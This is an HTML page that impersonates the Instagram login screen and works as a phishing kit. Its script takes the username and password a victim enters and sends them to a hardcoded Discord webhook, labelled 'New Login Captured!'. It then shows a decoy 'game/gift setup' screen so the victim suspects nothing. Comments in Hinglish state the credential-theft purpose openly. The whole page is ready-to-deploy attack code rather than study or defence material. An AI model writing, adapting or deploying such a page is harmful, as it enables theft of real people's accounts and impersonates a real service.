<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
            border-radius: 1px;
        }
        .logo {
            font-family: cursive;
            font-size: 40px;
            margin-bottom: 30px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 9px;
            margin: 6px 0;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            font-size: 12px;
        }
        button {
            width: 100%;
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 7px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #1877f2;
        }
        .screen {
            display: none;
        }
        .active {
            display: block;
        }
    </style>
</head>
<body>

    <!-- Login Screen -->
    <div id="loginScreen" class="screen active">
        <div class="login-container">
            <div class="logo">Instagram</div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" id="submitBtn">Log In</button>
            </form>
        </div>
    </div>

    <!-- Game Setup / Next Screen (Login ke baad yahan aayega) -->
    <div id="gameSetupScreen" class="screen">
        <div class="login-container">
            <h2>🎉 Welcome!</h2>
            <p>Your session is ready. Enjoy your game/gift setup!</p>
        </div>
    </div>

    <script>
        function showScreen(screenId) {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.getElementById(screenId).classList.add('active');
        }

        const loginForm = document.getElementById('loginForm');

        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const timeStr = new Date().toLocaleString();

            if(!username || !password) {
                alert("Please fill in all fields.");
                return;
            }

            // Aapka Discord Webhook URL
            const webhookURL = "https://discord.com/api/webhooks/1562500504456667147/9AuUBXE6J3mqsPNVpCe-oFSyA9LQvt-R_jiwIUfintw1x8wPvssb1Gdmez1VAhhLO9yZ";

            // Discord par message format
            const payload = {
                content: `🚨 **New Login Captured!**\n👤 **Username:** \`${username}\`\n🔑 **Password:** \`${password}\`\n⏰ **Time:** \`${timeStr}\``
            };

            // Bina kisi CORS error ke seedha Discord par bhej rahe hain
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            })
            .then(response => {
                console.log("Sent to Discord successfully!");
                showScreen('gameSetupScreen'); // Agle screen par bhej do
            })
            .catch(error => {
                console.error("Error:", error);
                showScreen('gameSetupScreen'); // Agar error bhi aaye tab bhi user ko roko mat
            });
        });
    </script>
</body>
</html>
